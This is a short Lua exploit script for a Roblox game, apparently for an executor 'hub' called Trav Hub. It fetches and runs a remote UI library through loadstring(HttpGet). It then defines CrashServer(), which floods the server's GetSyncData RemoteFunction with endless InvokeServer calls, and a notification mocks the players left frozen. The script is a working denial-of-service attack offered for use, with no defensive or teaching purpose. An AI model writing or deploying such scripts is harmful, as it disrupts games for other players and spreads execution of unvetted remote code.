local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

pcall(function()
    WindUI:SetTheme("Midnight")
end)

WindUI:SetFont("rbxasset://fonts/families/FredokaOne.json")

function CrashServer()
    local e = game:GetService("ReplicatedStorage").GetSyncData
    local InvokeServer = e.InvokeServer
    local spawn = task.spawn
    local a = 0;
    
    game:GetService("StarterGui"):SetCore(
        "SendNotification",
        {
            Title = "Server IS COOKED",
            Text = "look how ppl freezing mid air lmao",
            Duration = 5
        }
    )
    while 1 do
        for i = 1, 1 do
            spawn(InvokeServer, e)
        end
        a = a + 1
        if a == 3 then
            a = 0
            wait(0)
        end
    end
end

WindUI:Notify({ Title = "Trav Hub", Content = "Script loaded successfully!", Icon = "check-circle", Duration = 5 })